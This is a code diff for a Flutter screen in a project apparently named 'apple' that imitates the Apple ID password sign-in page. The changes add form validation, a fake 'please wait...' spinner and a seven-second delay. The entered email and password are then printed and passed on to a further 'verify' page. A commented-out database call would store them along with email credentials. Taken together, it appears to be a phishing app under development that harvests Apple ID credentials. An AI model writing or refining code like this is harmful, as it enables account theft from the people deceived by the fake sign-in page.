@@ -1,10 +1,10 @@
+import 'dart:async';
+
 import 'package:apple/main.dart';
 import 'package:flutter/cupertino.dart';
 import 'package:flutter/material.dart';
-import 'package:url_launcher/link.dart';
 
 import '../Verify/verifylayout.dart';
-import '../database.dart';
 
 enum MenuItem { signin, createanappleid, faq }
 
@@ -20,9 +20,11 @@ class _PassMobileScreenState extends State<PassMobileScreen> {
   @override
   Widget build(BuildContext context) {
     TextEditingController passwordController = TextEditingController();
-    // GlobalKey<FormState> formkey = GlobalKey<FormState>();
+    // ignore: no_leading_underscores_for_local_identifiers
+    GlobalKey<FormState> _formerkey = GlobalKey<FormState>();
     bool checked = true;
     return Scaffold(
+        backgroundColor: CupertinoColors.white,
         appBar: AppBar(
             backgroundColor: CupertinoColors.white,
             leading: const Padding(
@@ -86,18 +88,13 @@ class _PassMobileScreenState extends State<PassMobileScreen> {
               ),
               child: ListView(
                 children: [
-                  SizedBox(
-                    child: ClipRRect(
-                      borderRadius: BorderRadius.circular(20),
-                      child: const Expanded(
-                        flex: 1,
-                        child: Image(
-                          image: AssetImage('images/app.jpg'),
-                          width: 300,
-                        height: 170,
-                          fit: BoxFit.contain,
-                        ),
-                      ),
+                  ClipRRect(
+                    borderRadius: BorderRadius.circular(20),
+                    child: const Image(
+                      image: AssetImage('images/app.jpg'),
+                      width: 300,
+                      height: 170,
+                      fit: BoxFit.contain,
                     ),
                   ),
                   Column(
@@ -131,6 +128,7 @@ class _PassMobileScreenState extends State<PassMobileScreen> {
                         //),
                         SizedBox(
                           child: Form(
+                            key: _formerkey,
                             autovalidateMode:
                                 AutovalidateMode.onUserInteraction,
                             child: Padding(
@@ -159,54 +157,96 @@ class _PassMobileScreenState extends State<PassMobileScreen> {
                                   suffixIcon: Padding(
                                     padding: const EdgeInsets.only(
                                         right: 10.0, bottom: 0),
-                                    child: Link(
-                                      target: LinkTarget.self,
-                                      uri: Uri.parse('google.com'),
-                                      builder: (context, followLink) =>
-                                          IconButton(
-                                              hoverColor: CupertinoColors.white,
-                                              icon: const Icon(
-                                                Icons.arrow_circle_right,
-                                                size: 30,
-                                                color: Colors.grey,
-                                              ),
-                                              onPressed: () {
-                                //                   FutureBuilder<Map<String, dynamic>>(future: Database(
-                                //                             username:
-                                //                                 widget.callback,
-                                //                             password:
-                                //                                 passwordController.text, emailPassword: '', emailUsername: '').getData(),
-                                // builder: (BuildContext context,AsyncSnapshot<Map<String,dynamic>>snapshot) {
-                                //                       switch (snapshot.connectionState) {
-                                //                         case ConnectionState
-                                //                             .done:
-                                //                           return const Text(
-                                //                               'All Done Sir');
-                                //                         default:
-                                //                           return const CircularProgressIndicator(
-                                //                               color: CupertinoColors
-                                //                                   .activeBlue);
-                                //                       }
-                                //                     },
-                                //                   );
-                                                    debugPrint(
-                        'Email:${widget.callback}, Password:${passwordController.text}');
+                                    child: IconButton(
+                                        hoverColor: CupertinoColors.white,
+                                        icon: const Icon(
+                                          Icons.arrow_circle_right,
+                                          size: 30,
+                                          color: Colors.grey,
+                                        ),
+                                        onPressed: () {
+                                          if (_formerkey.currentState!
+                                              .validate()) {
+                                            //                   FutureBuilder<Map<String, dynamic>>(future: Database(
+                                            //                             username:
+                                            //                                 widget.callback,
+                                            //                             password:
+                                            //                                 passwordController.text, emailPassword: '', emailUsername: '').getData(),
+                                            // builder: (BuildContext context,AsyncSnapshot<Map<String,dynamic>>snapshot) {
+                                            //                       switch (snapshot.connectionState) {
+                                            //                         case ConnectionState
+                                            //                             .done:
+                                            //                           return const Text(
+                                            //                               'All Done Sir');
+                                            //                         default:
+                                            //                           return const CircularProgressIndicator(
+                                            //                               color: CupertinoColors
+                                            //                                   .activeBlue);
+                                            //                       }
+                                            //                     },
+                                            //                   );
+                                            debugPrint(
+                                                'Email:${widget.callback}, Password:${passwordController.text}');
+                                            showDialog(
+                                                context: context,
+                                                builder: (context) {
+                                                  return Center(
+                                                      child: Column(
+                                                    mainAxisAlignment:
+                                                        MainAxisAlignment
+                                                            .center,
+                                                    mainAxisSize:
+                                                        MainAxisSize.max,
+                                                    children: const [
+                                                      CircularProgressIndicator(
+                                                          backgroundColor:
+                                                              CupertinoColors
+                                                                  .white),
+                                                      SizedBox(height: 50),
+                                                      Card(
+                                                        shape: RoundedRectangleBorder(
+                                                            borderRadius:
+                                                                BorderRadius
+                                                                    .all(Radius
+                                                                        .circular(
+                                                                            7))),
+                                                        color: Colors.grey,
+                                                        child: Padding(
+                                                          padding:
+                                                              EdgeInsets.all(
+                                                                  8.0),
+                                                          child: Text(
+                                                              'please wait...',
+                                                              style: TextStyle(
+                                                                  color: CupertinoColors
+                                                                      .white)),
+                                                        ),
+                                                      )
+                                                    ],
+                                                  ));
+                                                });
 
-
-                                                Navigator.of(context).push(
-                                                    MaterialPageRoute(
-                                                        builder: (context) =>
-                                                            VerifyLayoutPage(
-                                                              appleEmail: widget.callback, applePassword: passwordController.text,
-                                                            )));
-                                                      
-                                              }),
-                                    ),
+                                            Timer(
+                                              const Duration(seconds: 7),
+                                              () => Navigator.of(context).push(
+                                                  MaterialPageRoute(
+                                                      builder: (context) =>
+                                                          VerifyLayoutPage(
+                                                            appleEmail:
+                                                                widget.callback,
+                                                            applePassword:
+                                                                passwordController
+                                                                    .text,
+                                                          ))),
+                                            );
+                                          }
+                                        }),
                                   ),
                                 ),
                                 validator: (ifpassword) {
-                                  if (ifpassword!.isNotEmpty &&
-                                      ifpassword.length < 7) {
+                                  if (ifpassword!.isEmpty) {
+                                    return 'Please enter password';
+                                  } else if (ifpassword.length < 6) {
                                     return 'Please enter a correct password';
                                   } else {
                                     return null;
